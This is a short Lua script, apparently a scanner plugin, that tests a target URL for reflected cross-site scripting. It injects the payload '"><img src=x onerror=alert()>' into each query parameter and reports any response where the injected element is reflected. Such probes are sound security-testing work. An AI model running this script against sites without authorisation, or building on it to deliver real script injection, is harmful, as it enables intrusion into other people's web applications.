REPORT = {}
VALID = false


PAYLOAD = '"><img src=x onerror=alert()>'

local function main(url)
    local new_querys = change_urlquery(url,PAYLOAD)
    for url_index, new_url in pairs(new_querys) do 
        local resp = send_req(new_url)
        local body = resp.body:GetStrOrNil()
        if body == "" then
            return
        end
        local css_pattern = generate_css_selector(PAYLOAD)
        if string.len(css_pattern) > 0 then
            local searcher = html_search(body,css_pattern)
            if string.len(searcher) > 0 then
                println(string.format("RXSS: %s | %s | %s ",resp.url:GetStrOrNil(),PAYLOAD,css_pattern))
                REPORT["url"] = new_url
                REPORT["match"] = css_pattern
                REPORT["payload"] = PAYLOAD
                VALID = true
            end
        end
    end
    return REPORT
end


main(TARGET_URL)
